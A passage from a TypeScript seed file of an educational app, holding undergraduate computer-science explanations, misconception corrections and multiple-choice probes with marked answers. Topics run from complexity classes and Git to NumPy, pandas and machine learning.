    stem: 'A TM loops forever on input w. Has it rejected w?',
    choices: [
      { text: 'No — looping means neither accept nor reject; only halting means accept or reject', isCorrect: true },
      { text: 'Yes — looping eventually counts as rejection', isCorrect: false, misconceptionId: `${TURING}:M1` },
      { text: 'Yes — after a timeout it rejects', isCorrect: false },
      { text: 'Depends on number of states', isCorrect: false },
    ], correctValue: 'No — looping = neither accept nor reject', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${TURING}:M1`], source: TURING_SRC },
]

const CPLXCLS = 'cs.theory.complexity-classes'
const CPLXCLS_SRC = 'docs/computer-science/kg/graph.json — cs.theory.complexity-classes'
const CPLXCLS_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CPLXCLS, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Complexity classes group problems by resources required. P: solvable in polynomial time deterministically. NP: solutions verifiable in polynomial time (equivalently, solvable non-deterministically in polynomial time). P ⊆ NP; P = NP is the central open problem in CS. NP-complete: every NP problem reduces to them in polynomial time (Cook-Levin: SAT is NP-complete). NP-hard: at least as hard as NP-complete but not necessarily in NP. PSPACE and EXP require more resources; L/NL are space-bounded classes.',
    targetedMisconceptions: [`${CPLXCLS}:M1`], source: CPLXCLS_SRC },
  { conceptId: CPLXCLS, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "NP means Not Polynomial." NP stands for Non-deterministic Polynomial — problems verifiable in polynomial time. This is precise, not a synonym for "hard." Another error: "NP-hard means unsolvable." NP-hard means no polynomial-time algorithm is known; many NP-hard instances are solved efficiently in practice by SAT solvers and branch-and-bound. Third: P ≠ NP is NOT proven — it is the most famous open problem in mathematics/CS.',
    targetedMisconceptions: [`${CPLXCLS}:M1`], source: CPLXCLS_SRC },
]
const CPLXCLS_PROBES: SeedProbe[] = [
  { conceptId: CPLXCLS, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which statement about NP-complete problems is correct?',
    choices: [
      { text: 'Every NP problem reduces to them in polynomial time', isCorrect: true },
      { text: 'They are unsolvable in any amount of time', isCorrect: false },
      { text: 'They require exponential space', isCorrect: false },
      { text: 'They are a subset of P', isCorrect: false },
    ], correctValue: 'Every NP problem poly-time reduces to them', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [], source: CPLXCLS_SRC },
  { conceptId: CPLXCLS, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What does "NP" stand for in complexity theory?',
    choices: [
      { text: 'Non-deterministic Polynomial time', isCorrect: true },
      { text: 'Not Polynomial', isCorrect: false, misconceptionId: `${CPLXCLS}:M1` },
      { text: 'Nearly Polynomial', isCorrect: false },
      { text: 'Nondecidable Problem', isCorrect: false },
    ], correctValue: 'Non-deterministic Polynomial time', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${CPLXCLS}:M1`], source: CPLXCLS_SRC },
]

// ─── cs.se (4 concepts) ───────────────────────────────────────────────────

const SDLC = 'cs.se.sdlc'
const SDLC_SRC = 'docs/computer-science/kg/graph.json — cs.se.sdlc'
const SDLC_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: SDLC, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'The Software Development Life Cycle (SDLC) structures software production: Requirements → Design → Implementation → Testing → Deployment → Maintenance. Models differ in sequencing. Waterfall executes phases linearly — each complete before the next; suitable when requirements are stable. Iterative/Spiral models repeat phases in cycles. Agile (Scrum, Kanban) delivers working software in short sprints, incorporating feedback continuously. Key trade-off: predictability (Waterfall) vs. adaptability (Agile). No model eliminates phases — they shift when and how often each occurs.',
    targetedMisconceptions: [`${SDLC}:M1`], source: SDLC_SRC },
  { conceptId: SDLC, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Agile means no planning or documentation." Agile values working software over comprehensive documentation — not zero documentation. Planning happens every sprint; the product backlog is active requirements management. Another error: "Waterfall is always worse than Agile." Waterfall suits projects with fixed, well-understood requirements (embedded firmware, safety-critical systems) where late changes are extremely costly. Model choice depends on project context, not fashion.',
    targetedMisconceptions: [`${SDLC}:M1`], source: SDLC_SRC },
]
const SDLC_PROBES: SeedProbe[] = [
  { conceptId: SDLC, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which SDLC model completes all requirements before any coding begins, with no formal return to earlier phases?',
    choices: [
      { text: 'Waterfall', isCorrect: true },
      { text: 'Agile/Scrum', isCorrect: false },
      { text: 'Spiral', isCorrect: false },
      { text: 'Kanban', isCorrect: false },
    ], correctValue: 'Waterfall', difficulty: ProbeDifficulty.FOUNDATIONAL, targetedMisconceptions: [], source: SDLC_SRC },
  { conceptId: SDLC, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Does Agile software development eliminate requirements analysis?',
    choices: [
      { text: 'No — requirements are gathered continuously via backlog refinement and sprint planning', isCorrect: true },
      { text: 'Yes — Agile replaces requirements with user stories and needs no analysis', isCorrect: false, misconceptionId: `${SDLC}:M1` },
      { text: 'Yes — requirements only matter in Waterfall', isCorrect: false },
      { text: 'No — but Agile does requirements analysis only once at project start', isCorrect: false },
    ], correctValue: 'No — continuous not eliminated', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${SDLC}:M1`], source: SDLC_SRC },
]

const VCSGIT = 'cs.se.version-control-git'
const VCSGIT_SRC = 'docs/computer-science/kg/graph.json — cs.se.version-control-git'
const VCSGIT_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: VCSGIT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Git is a distributed version control system: every developer has a full repository copy. Core concepts: commit (snapshot of staged changes), branch (movable pointer to a commit), merge (integrating branch histories), rebase (rewriting commits onto a new base). Workflow: git init/clone → edit → git add (stage) → git commit (local) → git push (remote). Branches enable parallel development; pull/merge requests are the code-review gate. Conflicts arise when two branches change the same lines — resolved manually. Git stores content as a DAG of commit objects, not file diffs.',
    targetedMisconceptions: [`${VCSGIT}:M1`], source: VCSGIT_SRC },
  { conceptId: VCSGIT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "git commit saves my work to GitHub." Commit saves to the LOCAL repository only — push sends commits to the remote. Another error: "git pull overwrites my local changes." git pull = fetch + merge; if your branch has local commits a merge occurs, it does not blindly overwrite. Third: "Deleting a branch deletes its commits." A branch is just a pointer — commits persist until garbage collected; git branch -d only removes the label.',
    targetedMisconceptions: [`${VCSGIT}:M1`], source: VCSGIT_SRC },
]
const VCSGIT_PROBES: SeedProbe[] = [
  { conceptId: VCSGIT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What does `git add` do?',
    choices: [
      { text: 'Stages changes for the next commit', isCorrect: true },
      { text: 'Saves changes to the remote repository', isCorrect: false },
      { text: 'Creates a new branch', isCorrect: false },
      { text: 'Merges two branches', isCorrect: false },
    ], correctValue: 'Stages changes', difficulty: ProbeDifficulty.FOUNDATIONAL, targetedMisconceptions: [], source: VCSGIT_SRC },
  { conceptId: VCSGIT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'After `git commit`, are your changes visible on GitHub?',
    choices: [
      { text: 'No — commit saves locally; `git push` is needed to send to the remote', isCorrect: true },
      { text: 'Yes — commit automatically sends to GitHub', isCorrect: false, misconceptionId: `${VCSGIT}:M1` },
      { text: 'Yes, but only if you are on the main branch', isCorrect: false },
      { text: 'No — you must open a pull request first', isCorrect: false },
    ], correctValue: 'No — push is required', difficulty: ProbeDifficulty.FOUNDATIONAL, targetedMisconceptions: [`${VCSGIT}:M1`], source: VCSGIT_SRC },
]

const SWTEST = 'cs.se.software-testing'
const SWTEST_SRC = 'docs/computer-science/kg/graph.json — cs.se.software-testing'
const SWTEST_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: SWTEST, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Software testing verifies code behaves as intended. Testing pyramid: unit tests (individual functions, fast, isolated) → integration tests (component interactions) → end-to-end/system tests (full workflows, slow). Black-box testing derives tests from specifications; white-box uses internal code structure with coverage metrics (statement, branch, path). Key concepts: test case (input + expected output), regression test (prevents re-introducing fixed bugs), TDD (red→green→refactor). No testing proves absence of bugs — only demonstrates presence or absence of bugs found (Dijkstra).',
    targetedMisconceptions: [`${SWTEST}:M1`], source: SWTEST_SRC },
  { conceptId: SWTEST, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "100% code coverage means the software is bug-free." Coverage measures which lines/branches run during tests — not whether outputs are correct. A test that runs every line but never asserts anything achieves 100% coverage and catches nothing. Another error: "Testing is done after coding." TDD and CI integrate testing throughout. Third: "More tests always make software safer." Redundant tests slow CI without adding assurance; targeted boundary tests provide more value.',
    targetedMisconceptions: [`${SWTEST}:M1`], source: SWTEST_SRC },
]
const SWTEST_PROBES: SeedProbe[] = [
  { conceptId: SWTEST, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'In TDD, what is the correct order of steps?',
    choices: [
      { text: 'Write failing test → Write code to pass → Refactor', isCorrect: true },
      { text: 'Write code → Write test → Refactor', isCorrect: false },
      { text: 'Write test → Refactor → Write code', isCorrect: false },
      { text: 'Refactor → Write code → Write test', isCorrect: false },
    ], correctValue: 'Test first (Red → Green → Refactor)', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [], source: SWTEST_SRC },
  { conceptId: SWTEST, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A test suite achieves 100% branch coverage. Can you conclude the software has no bugs?',
    choices: [
      { text: 'No — coverage shows which branches ran, not whether outputs are correct', isCorrect: true },
      { text: 'Yes — 100% coverage proves correctness', isCorrect: false, misconceptionId: `${SWTEST}:M1` },
      { text: 'Yes, if the tests also cover edge cases', isCorrect: false },
      { text: 'No — but it guarantees the main user paths work', isCorrect: false },
    ], correctValue: 'No — correctness is not coverage', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${SWTEST}:M1`], source: SWTEST_SRC },
]

const AGILEDESIGN = 'cs.se.agile-design-principles'
const AGILEDESIGN_SRC = 'docs/computer-science/kg/graph.json — cs.se.agile-design-principles'
const AGILEDESIGN_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: AGILEDESIGN, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Agile design principles keep software adaptable as requirements change. SOLID (Robert Martin): Single Responsibility (one reason to change), Open/Closed (open for extension, closed for modification), Liskov Substitution (subtypes replace base types safely), Interface Segregation (small specific interfaces), Dependency Inversion (depend on abstractions). DRY: every piece of knowledge has one authoritative representation. YAGNI: do not build features until required. KISS: keep it simple. These principles reduce coupling and increase cohesion — making code easier to test, extend, and maintain.',
    targetedMisconceptions: [`${AGILEDESIGN}:M1`], source: AGILEDESIGN_SRC },
  { conceptId: AGILEDESIGN, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Applying all SOLID principles always produces better code." SOLID principles are heuristics, not laws. Over-applying Interface Segregation and Dependency Inversion in small projects adds indirection without benefit. YAGNI directly warns against premature abstraction. Good design balances principles against current complexity — introduce abstractions when the pain of not having them is real, not anticipated.',
    targetedMisconceptions: [`${AGILEDESIGN}:M1`], source: AGILEDESIGN_SRC },
]
const AGILEDESIGN_PROBES: SeedProbe[] = [
  { conceptId: AGILEDESIGN, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'The "O" in SOLID stands for:',
    choices: [
      { text: 'Open/Closed Principle — open for extension, closed for modification', isCorrect: true },
      { text: 'Object-Oriented design', isCorrect: false },
      { text: 'Overloading Restriction', isCorrect: false },
      { text: 'Output Isolation', isCorrect: false },
    ], correctValue: 'Open/Closed Principle', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [], source: AGILEDESIGN_SRC },
  { conceptId: AGILEDESIGN, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Should you always apply all five SOLID principles to every class you write?',
    choices: [
      { text: 'No — over-applying them in simple contexts adds unnecessary complexity; YAGNI cautions against this', isCorrect: true },
      { text: 'Yes — SOLID principles always improve code', isCorrect: false, misconceptionId: `${AGILEDESIGN}:M1` },
      { text: 'Yes, but only in large enterprise systems', isCorrect: false },
      { text: 'No — SOLID only applies to Java, not Python', isCorrect: false },
    ], correctValue: 'No — heuristics not laws', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${AGILEDESIGN}:M1`], source: AGILEDESIGN_SRC },
]

// ─── cs.ds (7 concepts) ───────────────────────────────────────────────────

const NPARRAYS = 'cs.ds.numpy-arrays'
const NPARRAYS_SRC = 'docs/computer-science/kg/graph.json — cs.ds.numpy-arrays'
const NPARRAYS_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: NPARRAYS, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'NumPy\'s ndarray is a fixed-type multi-dimensional array in contiguous memory. Operations execute as compiled C/Fortran loops — orders of magnitude faster than Python list iteration. Core concepts: shape (dimension tuple), dtype (element type e.g. float64), axes. Vectorised operations apply element-wise without Python loops: a + b, np.sqrt(a). Broadcasting allows operations between compatible shapes (e.g., (4,3) matrix + (3,) vector). Boolean mask indexing: a[a > 0]. Key functions: np.zeros, np.ones, np.arange, np.linspace, np.reshape, np.dot. Always prefer vectorised operations over Python loops.',
    targetedMisconceptions: [`${NPARRAYS}:M1`], source: NPARRAYS_SRC },
  { conceptId: NPARRAYS, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A Python for-loop over a NumPy array has the same speed." Iterating with a Python loop defeats NumPy\'s purpose; vectorised operations run 10–100× faster with no interpreter overhead per element. Another error: "np.reshape copies the data." reshape returns a VIEW (same memory) when possible — modifying the reshaped array modifies the original. Use .copy() when independence is needed. Third: broadcasting aligns shapes from the RIGHT — (3,) broadcast with (4,3) adds the vector to each row.',
    targetedMisconceptions: [`${NPARRAYS}:M1`], source: NPARRAYS_SRC },
]
const NPARRAYS_PROBES: SeedProbe[] = [
  { conceptId: NPARRAYS, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is the result of np.array([1,2,3]) + np.array([10,20,30])?',
    choices: [
      { text: '[11, 22, 33] — element-wise addition', isCorrect: true },
      { text: '[1,2,3,10,20,30] — concatenation', isCorrect: false },
      { text: 'Error — arrays must be same dtype', isCorrect: false },
      { text: '[[1,10],[2,20],[3,30]] — outer product', isCorrect: false },
    ], correctValue: '[11, 22, 33]', difficulty: ProbeDifficulty.FOUNDATIONAL, targetedMisconceptions: [], source: NPARRAYS_SRC },
  { conceptId: NPARRAYS, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You iterate over a large NumPy array with a Python for-loop. Is this as fast as a vectorised NumPy operation?',
    choices: [
      { text: 'No — Python for-loops are 10–100× slower due to interpreter overhead per element', isCorrect: true },
      { text: 'Yes — NumPy optimises for-loops automatically', isCorrect: false, misconceptionId: `${NPARRAYS}:M1` },
      { text: 'Yes, for integer arrays only', isCorrect: false },
      { text: 'No — but only for arrays larger than 10,000 elements', isCorrect: false },
    ], correctValue: 'No — much slower', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${NPARRAYS}:M1`], source: NPARRAYS_SRC },
]

const PANDADF = 'cs.ds.pandas-dataframes'
const PANDADF_SRC = 'docs/computer-science/kg/graph.json — cs.ds.pandas-dataframes'
const PANDADF_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: PANDADF, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A Pandas DataFrame is a 2D labelled structure: rows have an index, columns have names, each column is a typed Series. Core operations: pd.read_csv (load), df.head()/info()/describe() (explore), df[col] (select column), df.loc[row_label, col] / df.iloc[row_int, col] (select by label/position), df[condition] (boolean filter), df.groupby(col).agg(func) (split-apply-combine), df.merge(other, on=key) (join), df.fillna/dropna (handle missing). Avoid iterrows() — use vectorised column operations. .apply() runs Python per row when no vectorised form exists.',
    targetedMisconceptions: [`${PANDADF}:M1`], source: PANDADF_SRC },
  { conceptId: PANDADF, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "df[condition][\'col\'] = value modifies the original." Chained indexing (two [] operations) often modifies a copy and raises SettingWithCopyWarning. Use df.loc[condition, \'col\'] = value for in-place modification. Another error: "df.groupby().mean() keeps the original index." groupby resets or sets a new index from group keys — use .reset_index() to move keys back to columns. Third: confusing .loc (label) with .iloc (integer position) when the index is not a default RangeIndex.',
    targetedMisconceptions: [`${PANDADF}:M1`], source: PANDADF_SRC },
]
const PANDADF_PROBES: SeedProbe[] = [
  { conceptId: PANDADF, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which expression selects rows where column "age" is greater than 30?',
    choices: [
      { text: 'df[df["age"] > 30]', isCorrect: true },
      { text: 'df.select(df.age > 30)', isCorrect: false },
      { text: 'df.filter(age > 30)', isCorrect: false },
      { text: 'df.query_rows("age", 30)', isCorrect: false },
    ], correctValue: 'df[df["age"] > 30]', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [], source: PANDADF_SRC },
  { conceptId: PANDADF, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'df[df.score > 80]["grade"] = "A" — will this reliably update the DataFrame?',
    choices: [
      { text: 'No — chained indexing may modify a copy; use df.loc[df.score > 80, "grade"] = "A"', isCorrect: true },
      { text: 'Yes — boolean indexing always modifies in place', isCorrect: false, misconceptionId: `${PANDADF}:M1` },
      { text: 'Yes, as long as "grade" column exists', isCorrect: false },
      { text: 'No — you need to reassign: df = df[df.score > 80]', isCorrect: false },
    ], correctValue: 'No — use df.loc', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${PANDADF}:M1`], source: PANDADF_SRC },
]

const DATAVIZ = 'cs.ds.data-visualisation'
const DATAVIZ_SRC = 'docs/computer-science/kg/graph.json — cs.ds.data-visualisation'
const DATAVIZ_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: DATAVIZ, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Data visualisation translates numerical patterns into visual form. Chart selection depends on data type and question: scatter plot (relationship between two continuous variables), line chart (change over ordered time/sequence), bar chart (comparison across categories), histogram (distribution of one continuous variable), box plot (distribution + outliers across groups), heatmap (matrix of values). Libraries: Matplotlib (foundational), Seaborn (statistical), Plotly (interactive). Principles: label axes with units, use colour-blind-safe palettes, never truncate the y-axis to exaggerate differences, prefer small multiples over crowded overlapping series.',
    targetedMisconceptions: [`${DATAVIZ}:M1`], source: DATAVIZ_SRC },
  { conceptId: DATAVIZ, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A pie chart is good for comparing many categories." Pie charts work only for 2–4 categories where parts-of-whole is the message; humans compare angles poorly. Bar charts are almost always better. Another error: "A line chart works for any data." Lines imply order/continuity between adjacent points — using them for unordered categories implies a spurious trend; use a bar chart. Third: starting the y-axis at a non-zero value on bar charts exaggerates small changes — a common misleading technique.',
    targetedMisconceptions: [`${DATAVIZ}:M1`], source: DATAVIZ_SRC },
]
const DATAVIZ_PROBES: SeedProbe[] = [
  { conceptId: DATAVIZ, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You want to show the distribution of exam scores for 200 students. Which chart is most appropriate?',
    choices: [
      { text: 'Histogram — groups scores into bins and shows frequency', isCorrect: true },
      { text: 'Pie chart', isCorrect: false },
      { text: 'Line chart', isCorrect: false },
      { text: 'Scatter plot', isCorrect: false },
    ], correctValue: 'Histogram', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [], source: DATAVIZ_SRC },
  { conceptId: DATAVIZ, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You connect five unordered categories (cities) with a line chart. Is this appropriate?',
    choices: [
      { text: 'No — lines imply order/continuity; use a bar chart for unordered categories', isCorrect: true },
      { text: 'Yes — line charts work for any data', isCorrect: false, misconceptionId: `${DATAVIZ}:M1` },
      { text: 'Yes, if the categories are alphabetical', isCorrect: false },
      { text: 'No — use a scatter plot instead', isCorrect: false },
    ], correctValue: 'No — use bar chart', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${DATAVIZ}:M1`], source: DATAVIZ_SRC },
]

const INTROML = 'cs.ds.intro-machine-learning'
const INTROML_SRC = 'docs/computer-science/kg/graph.json — cs.ds.intro-machine-learning'
const INTROML_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: INTROML, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Machine learning (ML) systems learn patterns from data rather than following explicit rules. Core paradigms: supervised learning (labelled examples → predict label for new input), unsupervised learning (find structure in unlabelled data), reinforcement learning (learn via rewards). ML workflow: collect/clean data → split train/validation/test → choose model → train (minimise loss on training set) → evaluate on validation → tune hyperparameters → final evaluation on test set (once). Key concepts: features, labels, loss function, overfitting (memorises training data), underfitting (too simple), bias-variance trade-off.',
    targetedMisconceptions: [`${INTROML}:M1`], source: INTROML_SRC },
  { conceptId: INTROML, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "High training accuracy means the model is good." 99% training accuracy with 60% test accuracy is severe overfitting — the model memorised the training set. The test set (held out until final evaluation) is the only honest measure. Another error: "More data always improves the model." Noisy, mislabelled, or irrelevant data can degrade performance. Third: "ML models understand concepts the way humans do." ML models find statistical correlations; they have no understanding of causation or meaning.',
    targetedMisconceptions: [`${INTROML}:M1`], source: INTROML_SRC },
]
const INTROML_PROBES: SeedProbe[] = [
  { conceptId: INTROML, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A model achieves 99% accuracy on training data and 55% on test data. What is the likely problem?',
    choices: [
      { text: 'Overfitting — the model memorised training examples rather than learning generalisable patterns', isCorrect: true },
      { text: 'Underfitting', isCorrect: false },
      { text: 'Data leakage from the test set', isCorrect: false },
      { text: 'Too small a learning rate', isCorrect: false },
    ], correctValue: 'Overfitting', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [], source: INTROML_SRC },
  { conceptId: INTROML, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You evaluate your model on the test set multiple times to tune hyperparameters. Is this valid?',
    choices: [
      { text: 'No — repeated test-set use leaks information; use a validation set for tuning', isCorrect: true },
      { text: 'Yes — the test set exists for evaluation', isCorrect: false, misconceptionId: `${INTROML}:M1` },
      { text: 'Yes, but only for the final 3 hyperparameter choices', isCorrect: false },
      { text: 'No — hyperparameters should never be tuned', isCorrect: false },
    ], correctValue: 'No — validation set for tuning, test set once', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${INTROML}:M1`], source: INTROML_SRC },
]

const SUPLEARN = 'cs.ds.supervised-learning-models'
const SUPLEARN_SRC = 'docs/computer-science/kg/graph.json — cs.ds.supervised-learning-models'
const SUPLEARN_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: SUPLEARN, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Supervised learning trains on labelled (input, output) pairs to predict outputs for new inputs. Task types: classification (discrete labels) and regression (continuous values). Key models: Linear Regression (weighted sum minimising MSE), Logistic Regression (classification via sigmoid — outputs probability), Decision Trees (axis-aligned splits; high variance), Random Forests (ensemble of trees via bagging; reduces variance), Gradient Boosted Trees (sequential ensemble; XGBoost/LightGBM), SVMs (maximum-margin hyperplane), k-NN (majority vote of k nearest examples). Evaluation: accuracy/precision/recall/F1 (classification), MAE/RMSE/R² (regression).',
    targetedMisconceptions: [`${SUPLEARN}:M1`], source: SUPLEARN_SRC },
  { conceptId: SUPLEARN, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Logistic Regression is used for regression tasks." Despite the name, logistic regression is a CLASSIFICATION algorithm — the "regression" refers to the underlying linear model, not the task type. Another error: "A more complex model is always better." Complex models overfit more easily; model selection should be guided by cross-validation performance. Third: "Accuracy is always the right metric." On imbalanced datasets (99% negative) a model predicting all-negative achieves 99% accuracy but is useless; use precision/recall/F1.',
    targetedMisconceptions: [`${SUPLEARN}:M1`], source: SUPLEARN_SRC },
]
const SUPLEARN_PROBES: SeedProbe[] = [
  { conceptId: SUPLEARN, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which supervised learning task predicts a continuous numerical output?',
    choices: [
      { text: 'Regression', isCorrect: true },
      { text: 'Classification', isCorrect: false },
      { text: 'Clustering', isCorrect: false },
      { text: 'Dimensionality reduction', isCorrect: false },
    ], correctValue: 'Regression', difficulty: ProbeDifficulty.FOUNDATIONAL, targetedMisconceptions: [], source: SUPLEARN_SRC },
  { conceptId: SUPLEARN, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Logistic Regression is used for which kind of task?',
    choices: [
      { text: 'Classification — predicting a discrete class (e.g., spam/not-spam)', isCorrect: true },
      { text: 'Regression — predicting a continuous number', isCorrect: false, misconceptionId: `${SUPLEARN}:M1` },
      { text: 'Clustering — grouping unlabelled data', isCorrect: false },
      { text: 'Dimensionality reduction', isCorrect: false },
    ], correctValue: 'Classification', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${SUPLEARN}:M1`], source: SUPLEARN_SRC },
]

const UNSUPLEARN = 'cs.ds.unsupervised-learning-models'
const UNSUPLEARN_SRC = 'docs/computer-science/kg/graph.json — cs.ds.unsupervised-learning-models'
const UNSUPLEARN_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: UNSUPLEARN, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Unsupervised learning finds structure in unlabelled data. Clustering groups similar examples: k-Means (assign to k centroids; iterate until stable — requires specifying k), DBSCAN (density-based; finds arbitrary-shape clusters and outliers; no k needed), Hierarchical Clustering (produces a dendrogram). Dimensionality reduction compresses features: PCA (linear axes of maximum variance; projections are uncorrelated), t-SNE/UMAP (non-linear; preserves local neighbourhood for 2D visualisation — NOT for downstream ML). Association Rule Mining (Apriori) finds frequent itemsets and rules like "if bread then butter" with support/confidence/lift.',
    targetedMisconceptions: [`${UNSUPLEARN}:M1`], source: UNSUPLEARN_SRC },
  { conceptId: UNSUPLEARN, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "k-Means always finds the correct clusters." k-Means converges to a local minimum — results depend on initialisation. Run multiple times (k-means++) and choose the run with lowest inertia. It also assumes spherical, equal-sized clusters and fails on non-convex shapes. Another error: "PCA components are the original features." PCA components are LINEAR COMBINATIONS of features — they may be uninterpretable. Third: "t-SNE cluster separation shows real distances." t-SNE distorts global distances — cluster separation in a t-SNE plot is NOT reliable for distance in original space.',
    targetedMisconceptions: [`${UNSUPLEARN}:M1`], source: UNSUPLEARN_SRC },
]
const UNSUPLEARN_PROBES: SeedProbe[] = [
  { conceptId: UNSUPLEARN, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'k-Means requires you to specify k before running. What does k represent?',
    choices: [
      { text: 'The number of clusters to find', isCorrect: true },
      { text: 'The number of features', isCorrect: false },
      { text: 'The number of iterations', isCorrect: false },
      { text: 'The distance metric', isCorrect: false },
    ], correctValue: 'Number of clusters', difficulty: ProbeDifficulty.FOUNDATIONAL, targetedMisconceptions: [], source: UNSUPLEARN_SRC },
  { conceptId: UNSUPLEARN, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Two clusters appear far apart on a t-SNE plot. Does this mean they are far apart in the original high-dimensional space?',
    choices: [
      { text: 'No — t-SNE preserves LOCAL neighbourhood but distorts global distances', isCorrect: true },
      { text: 'Yes — t-SNE preserves all distances faithfully', isCorrect: false, misconceptionId: `${UNSUPLEARN}:M1` },
      { text: 'Yes, if perplexity is set correctly', isCorrect: false },
      { text: 'No — t-SNE only shows clusters with zero variance', isCorrect: false },
